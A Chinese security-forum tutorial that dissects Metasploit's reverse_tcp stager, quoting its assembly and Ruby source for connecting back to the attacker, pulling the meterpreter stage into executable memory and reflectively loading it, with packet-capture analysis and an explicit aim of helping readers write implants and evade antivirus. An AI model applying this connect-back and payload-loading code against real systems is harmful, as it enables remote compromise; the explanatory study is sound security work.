

# 奇安信攻防社区 - 从 0 到 1 了解 metasploit 上线原理

### 从 0 到 1 了解 metasploit 上线原理

在渗透的过程中拿到权限后通常会进行上线 cs/msf 的操作，我们了解上线的原理后，无论是对编写远控，还是绕过杀软帮助都很大。

## 前言

在渗透的过程中拿到权限后通常会进行上线 cs/msf 的操作，我们了解上线的原理后，无论是编写远控，还是绕过杀软对我们帮助都很大。

本文会解读 metasploit 中的代码，详细的解释上线过程/原理。

## 载荷分类

metasploit 中有以下三种载荷。

-   singles:实现某种功能的载荷，如弹计算器，弹窗......这种载荷不与 metasploit 建立链接
-   stager:使用 msfvenom 生成的 shellcode，功能是链接 metasploit 并接收 msf 发送过来的载荷
-   stage:stager 拉取的载荷，它实现了 metasploit 中的 meterpreter 功能

在 msf 中 stage 通常指，名字是 meterpreter 的文件，后缀可以是 dll php py jar，比如图中圈起来的 meterpreter.x86.dll meterpreter.jar......

![image.png](assets/1698893687-b66634cff920a643bfe7ad82f96dcc1f.png)

## shellcode 功能

![image.png](assets/1698893687-f6047eefb9edcc99243cd3e22589a3e2.png)  
msfvenom 生成的 reverse\_tcp 的 shellcode 其实就是一个 stager，这段 shellcode 负责链接 metasploit 服务端，然后接收服务端发送的 stage 并加载，这个 stage 才是实现 meterpreter 的载荷。

下面我们来分析一下`reverse_tcp.rb`文件中的汇编代码，这些汇编代码可以理解为 reverse\_tcp shellcode 的汇编状态。  
文件路径：`\lib\msf\core\payload\windows\`

需要注意的是，这个文件在上线中没有任何作用，修改或者删除此文件中的汇编代码并不会对上线的过程造成任何影响。

我们主要关注以下是三个函数：`generate_reverse_tcp asm_reverse_tcp asm_block_recv`  
![image.png](assets/1698893687-2222a59f462e55fd604040ced926d790.png)

## generate\_reverse\_tcp 函数

先看一下这几行汇编

```c\+\+
call start ; Call start, this pushes the address of 'api_call' onto the stack. 
#{asm_block_api} start: pop ebp//将 asm_block_api 函数地址放到 ebp 中 
#{asm_reverse_tcp(opts)}//与 metasploit 建立连接 
#{asm_block_recv(opts)}//接收发送的 metsrv.dll
```

`call start`将`asm_block_api`函数的地址压入堆栈，接着执行了 start:下面的代码，pop ebp 是将`asm_block_api`函数的地址放到了 ebp 寄存器中。

`asm_block_api`函数的功能是根据函数的名称找到函数地址

## asm\_reverse\_tcp 函数

![image.png](assets/1698893687-30a1696bbe85000c859c521570ab2c53.png)

```js
reverse_tcp: push '32' ; Push the bytes 'ws2_32',0,0 onto the stack. 
    push 'ws2_' ; ... 
    push esp ; Push a pointer to the "ws2_32" string on the stack. 
    push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')} 
    mov eax, ebp 
    call eax ; 
    LoadLibraryA( "ws2_32" ) 
    mov eax, 0x0190 ; EAX = sizeof( struct WSAData ) 
    sub esp, eax ; alloc some space for the WSAData structure 
    push esp ; push a pointer to this stuct 
    push eax ; push the wVersionRequested parameter 
    push #{Rex::Text.block_api\_hash('ws2_32.dll', 'WSAStartup')} 
    call ebp ; WSAStartup( 0x0190, &WSAData );
```

先看一下 reverse\_tcp 的汇编，首先 push 了几个参数。

在第 5 行先调用了 block\_api\_hash 得到了 LoadLibraryA 函数的地址，接着将 LoadLibraryA 函数的地址压入了堆栈，然后调用了 asm\_block\_api 函数。

此函数调用 LoadLibraryA 加载了 ws2\_32 这个 dll，为下面使用 socket 链接 metasploit 做准备。  
从第 9 行开始，就是往堆栈中压入了一些参数，接着又调用了 WSAStartup 函数初始化了网络库。

下面这些汇编主要是压入了一些参数，接着在第 15 行调用了 WSASocketA 函数创建了一个套接字，接着把套接字存储到了 edi 中

```c
create_socket: 
    push #{encoded_host} ; host in little-endian format 
    push #{encoded_port} ; family AF_INET and port number 
    mov esi, esp ; save pointer to sockaddr struct 
    push eax ; if we succeed, eax will be zero, push zero for the flags param. 
    push eax ; push null for reserved parameter 
    push eax ; we do not specify a WSAPROTOCOL_INFO structure 
    push eax ; we do not specify a protocol inc eax ; 
    push eax ; push SOCK_STREAM 
    inc eax ; 
    push eax ; push AF_INET 
    push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')} 
    call ebp ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );//创建了 socket，为连接服务器做准备 
    xchg edi, eax ; save the socket for later, don't care about the value of eax after this
```

接着在第 7 行调用了 bind 函数，绑定了传入的 socket 结构体中的 ip 与端口

```c
push #{encoded_bind_port} ; family AF_INET and port number 
mov esi, esp ; save a pointer to sockaddr_in struct 
push #{sockaddr_size} ; length of the sockaddr_in struct (we only set the first 8 bytes, the rest aren't used) 
push esi ; pointer to the sockaddr_in struct 
push edi ; socket 
push #{Rex::Text.block_api_hash('ws2_32.dll', 'bind')} 
call ebp ; bind( s, &sockaddr_in, 16 ); 
push #{encoded_host} ; host in little-endian format 
push #{encoded_port} ; family AF_INET and port number 
mov esi, esp
```

接着又调用了 connect 函数链接 metasploit，如果 eax 中的值为 0 那么代表链接成功。

```c
push 16 ; length of the sockaddr struct 
push esi ; pointer to the sockaddr struct 
push edi ; the socket 
push #{Rex::Text.block_api_hash('ws2_32.dll', 'connect')} 
call ebp ; connect( s, &sockaddr, 16 ); 
test eax,eax ; non-zero means a failure 
jz connected 
handle_connect_failure: 
    ; decrement our attempt count and try again 
    dec dword [esi+8] 
    jnz try_connect
```

asm\_reverse\_tcp 函数中的汇编，大致有以下功能：加载 socket 相关 dll，创建 socket，绑定 ip 和端口，链接 metasploit。就是做一些接收 stage 前的工作，为调用 asm\_block\_recv 接收 stage 做准备。

## asm\_block\_recv 函数

![image.png](assets/1698893687-bd760f5516f889a4f8a8785cf3928a97.png)

首先调用 recv 函数接收 msf 发送过来的 4 字节数据，这 4 字节数据代表了即将发送过来的载荷的总大小。

```c
push 0 ; flags 
push 4 ; length = sizeof( DWORD ); 
push esi ; the 4 byte buffer on the stack to hold the second stage length 
push edi ; the saved socket 
push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')} 
call ebp ; recv( s, &dwLength, 4, 0 );
```

首先压入了 VirtualAlloc 函数的参数，接着在第 6 行使用 block\_api\_hash 函数得到了 VirtualAlloc 函数的地址。

接着调用了 VirtualAlloc 函数用来申请一块具有 RWX 权限的内存空间，空间的大小是 msf 发送过来的四字节数据。

```c
mov esi,[esi] ; dereference the pointer to the second stage length 
push 0x40 ; PAGE_EXECUTE_READWRITE 
push 0x1000 ; MEM_COMMIT 
push esi ; push the newly recieved second stage length. 
push 0 ; NULL as we dont care where the allocation is. 
push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')} 
call ebp ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE ); 
; Receive the second stage and execute it... 
xchg ebx, eax ; ebx = our new memory address for the new stage 
push ebx ; push the address of the new stage so we can return into it
```

在第 7 行又调用了 recv 函数，接收 msf 发送过来的载荷，通过 push 压入的参数可以知道，是将接收到的载荷放到了刚刚申请的内存中。

需要注意的是，msf 并不是一下子就把整个载荷发送了过来，而是把载荷分成了很多份分开发送的，所以下面通过 cmp 指令来判断是否接收完成，这里判断有没有接收完成的依据是通过，载荷的大小 - 接收的字节数来循环接收的。

```c
read_more: 
    push 0 ; flags 
    push esi ; length 
    push ebx ; the current address into our second stage's RWX buffer 
    push edi ; the saved socket 
    push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')} 
    call ebp ; recv( s, buffer, length, 0 );//recv 函数的返回值会放到 eax 寄存器中，返回值是接收了多少字节的数据 
    cmp eax, 0//将 eax 与 0 比较，如果 eax 大于或等于 0 那么就执行 jge 跳转到 read_successful 处执行 
    jge read_successful
```

下面的汇编主要是判断载荷有没有接收完成，如果没有接收完成就通过 jnz 跳转继续调用 read\_more 下的代码，如果接收完成就直接 ret。

```c
read_successful: 
    add ebx, eax ; buffer += bytes_received//跳过接收过得载荷的内存，因为不可能一直往一个内存地址里面塞载荷 
    sub esi, eax ; length -= bytes_received, will set flags//减去对载荷的大小 
    jnz read_more ; continue if we have more to read//如果 sub esi,eax 不等于 0 那么就执行 jnz 跳回 read\_more 继续接收，如果等于 0，代表接收载荷完成，就不会跳转到 read_more 而是直接 retn 返回 
    ret ; return into the second stage
```

到了这里，我们已经接收到了真正的载荷了，但是现在还无法运行，因为在内存中没有人调用它，下面我们先通过 wireshark 来分析上线的过程，看 metasploit 都发过来了什么，在分析 metsrv.dll 是如何被调用的。

## 上线流量分析

服务端做好监听，wireshark 做好过滤规则

![image.png](assets/1698893687-6f50aca947fe9173eb3a85cf08c3c87f.png)

成功抓取到了数据包  
![image.png](assets/1698893687-b5e9a779f3de3cd6e621c825760a18b3.png)  
从下图中可以看到，我们先与 metasploit 建立了链接，对应上面 asm\_reverse\_tcp 函数，接着 metasploit 向我们发送了一个 Len 为 4 的数据包，此数据包中的数据代表载荷的总大小。

数据包中的数据，是 0x2be43，因为数据包中的数据是按照小端存储的方式存储的，所以需要转换一下。

![image.png](assets/1698893687-4fd41fa4b45a3b2cb3a6c9589c4c5720.png)

0x2be43=179779(十进制)，这个值对应了 metasploit 向我们发送的载荷大小。

![image.png](assets/1698893687-377d05629329f7a0e4188aaf31c2d326.png)

接着看后面的数据包，从图中可以看到，msf 向我们发送了 stage 的开头，上面提到过 msf 不会一次性将整个 stage 发送过来，所以从图中可以看到 metasploit 一直在发送数据。

![image.png](assets/1698893687-5005340845160d592e307fde0fd22c0d.png)  
我们来看下接收完成后，是如何调用 stage 的

## stage 执行过程

stage 是通过 reflective dll(反射式注入) 技术调用的，因为是上线原理所以不会涉及到此技术原理。

meterpreter\_loader.rb 文件中的汇编用于调用 stage，我们看一下这个文件

![image.png](assets/1698893687-5d3f954e9a4dd0746f60b571edeca27d.png)

```c
def stage_meterpreter(opts={}) 
    # Exceptions will be thrown by the mixin if there are issues. 
    dll, offset = load_rdi_dll(MetasploitPayloads.meterpreter_path('metsrv', 'x86.dll'))//得到 ReflectiveLoader 函数的偏移 
    asm_opts = { 
        rdi_offset: offset, 
        length: dll.length, 
        stageless: opts[:stageless] == true
    } 
    asm = asm_invoke_metsrv(asm_opts) 
    # generate the bootstrap asm 

    bootstrap = Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string 

    # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry 
    if bootstrap.length > 62 
        raise RuntimeError, "Meterpreter loader (x86) generated an oversized bootstrap!" 
    end 

    # patch the bootstrap code into the dll's DOS header... 
    dll[ 0, bootstrap.length ] = bootstrap dll end
    dll 
end
```

来看一下下面的代码。

此函数功能：读取 dll，接着调用 parse\_pe 函数得到 ReflectiveLoader 函数的偏移，在第 11 行返回了 dll 的数据与函数的便宜。

parse\_pe 函数通过遍历 dll 的导出表得到名字是 ReflectiveLoader 函数的偏移

```c
def load_rdi_dll(dll_path) 
    dll = '' 
    ::File.open(dll_path, 'rb') { |f| dll = f.read } 
    offset = parse_pe(dll) 
    unless offset 
        raise "Cannot find the ReflectiveLoader entry point in #{dll_path}" 
    end 

    return dll, offset 
end 

def parse_pe(dll) 
    pe = Rex::PeParsey::Pe.new(Rex::ImageSource::Memory.new(dll)) 
    offset = nil 

    pe.exports.entries.each do |e| 
        if e.name =~ /^\\S\*ReflectiveLoader\\S\*/ 
        offset = pe.rva_to_file_ofset(e.rva) 
        break 
    end 
end 
    offset 
end
```

我们看一下 asm\_invoke\_metsrv 函数，这个函数调用了 ReflectiveLoader 函数，接着定位到了 stages 结束的地址。

![image.png](assets/1698893687-96bc6818df856e7636ec9b1b9d456aff.png)

```c
dec ebp ; 'M'//无效代码 
pop edx ; 'Z'//无效代码 
call $+5 ; call next instruction 
pop ebx ; get the current location (+7 bytes) 
push edx ; restore edx 
inc ebp ; restore ebp 
push ebp ; save ebp for later 
mov ebp, esp ; set up a new stack frame 
; Invoke ReflectiveLoader() 
; add the offset to ReflectiveLoader() (0x????????) 

add ebx, #{"0x%.8x" % (opts[:rdi_offset] - 7)} 
call ebx ; invoke ReflectiveLoader() 
; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr) 
; offset from ReflectiveLoader() to the end of the DLL 

add ebx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
```

前两行的代码，没什么实际功能，只是为了 stages 能被识别为 pe 文件，因为这两个汇编的字节码是 0x4d 0x5a 对应 pe 结构中的 MZ

pop ebx 将当前地址放到了 ebx 中，下面几行是恢复被修改的寄存器，保存栈底和提升栈顶

```c
add ebx, #{"0x%.8x" % (opts[:rdi_offset] - 7)}//基地址 + 偏移=真正函数地址 
call ebx ; invoke ReflectiveLoader() 
; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr) 
; offset from ReflectiveLoader() to the end of the DLL 
add ebx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
```

先说一下 call 后面的地址是怎么来的，call 地址=目标地址-call 下一条指令地址

来看下这个指令 add ebx, #{"0x%.8x" % (opts\[:rdi\_offset\] - 7)}，代码中的 rdi\_offset 是 ReflectiveLoader 函数的偏移地址。

这句汇编通过基地址 + 偏移得到真正的 ReflectiveLoader 函数地址，准备调用，这里说下为啥 -7。

现在 ebx 中是 pop ebx 的地址，在 pop ebx 前面还有三条指令 dec ebp,pop edx,call $+5，这三条指令加到一起的长度是 7 个字节。

而要得到一个函数的地址应该是基地址 + 偏移，在这里的代码中，真正的基地址应该是 dec ebp 这里，而不是 pop ebx 这里，dec ebp 的地址+ReflectiveLoader 函数的偏移才是真正的 ReflectiveLoader 函数地址，而不是 pop ebx 的地址+ReflectiveLoader 的偏移，所以 pop ebx 的地址要 -7 个字节回到 dec ebp 这里。

![image.png](assets/1698893687-78c584fe8f3f4176f52aba3bb33c6d51.png)  
接着调用了 call ebx 执行了 ReflectiveLoader 函数，ReflectiveLoader 函数主要是解析 dll 的 pe 信息，并根据这些信息重新把 dll 写入到内存中，然后修复 dll 的各种表，修复完成后会使用 DLLMETASPLOIT\_ATTACH 调用 dllmain 函数，接着会把 dllmain 函数地址返回到 eax 寄存器中。

add ebx, #{"0x%.8x" % (opts\[:length\] - opts\[:rdi\_offset\])}这行主要是定位到 dll 结束的地址，因为 length 是 dll 的总大小，它-reflectiveLoader 函数的偏移就得到了剩余部分的大小，接着又让 ebx+ 剩余部分大小=dll 结束地址

```c
mov [ebx], edi ; write the current socket/handle to the config//保存 socket 句柄到 ebx 的地址中 
push ebx ; push the pointer to the configuration start 

push 4 ; indicate that we have attached 

push eax ; push some arbitrary value for hInstance 

call eax ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
```

metasploit 发送载荷时会发送 3 部分数据

-   载荷的总大小
-   stage
-   配置数据

配置数据是与 stage 连在一起的。

现在 ebx 指向的是 stagel 结束的地址，第一行也就是将 edi 的值放到了配置结构中。

下面几行代码就是传入参数，接着在第 5 行调用了 DLLMain 函数。

现在 stage 就开始运行了。

但是在`meterpreter_loader.rb`这个文件中，还没有结束，我们继续看。

![image.png](assets/1698893687-13ba0025e6b629a11ffab1f1d76d785e.png)

```c
asm = asm_invoke_metsrv(asm_opts)//返回了上面 asm_invoke_metsrv 函数中的汇编 
# generate the bootstrap asm 
bootstrap = Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string//生成引导代码 
# sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry 
if bootstrap.length > 62 
    raise RuntimeError, "Meterpreter loader (x86) generated an oversized bootstrap!" 
end 

# patch the bootstrap code into the dll's DOS header... 

dll[ 0, bootstrap.length ] = bootstrap//替换原有的 dos 头
```

主要是生成了一段 bootstrap(引导代码)，接着在 12 行使用生成的引导代码替换掉了 stages 的 dos 头。

## 手写 Stager 替代 shellcode

上面已经把 msfvenom 生成的 shellcode 干了什么给搞清楚了，现在咱们来手写一个 Stager，这样也是有一定的免杀效果的，因为在我们编写的 Stager 中是没有 shellcode 存在。

[文章链接](https://forum.butian.net/share/1614)

## 总结

文章主要通过分析 metasploit 代码与流量分析，解释了 metasploit 中 reverse\_Tcp 的 shellcode 的上线过程，接着用 c 语言实现了一个 stager，文章内容比较基础，而且难免会有错误，请各位师傅斧正。如果有不清楚的地方欢迎私信骚扰。

## 参考

-   [https://github.com/rapid7/metasploit-payloads](https://github.com/rapid7/metasploit-payloads) rapid7 公开的 metasploit 的载荷源码
-   [https://github.com/rapid7/ReflectiveDLLInjection](https://github.com/rapid7/ReflectiveDLLInjection) 反射式 dll 注入
-   [https://github.com/stephenfewer/ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection)
-   [https://bbs.kanxue.com/thread-247616.htm](https://bbs.kanxue.com/thread-247616.htm)
-   [https://www.cnblogs.com/Akkuman/p/12859091.html](https://www.cnblogs.com/Akkuman/p/12859091.html)
-   [https://xz.aliyun.com/t/1709](https://xz.aliyun.com/t/1709)
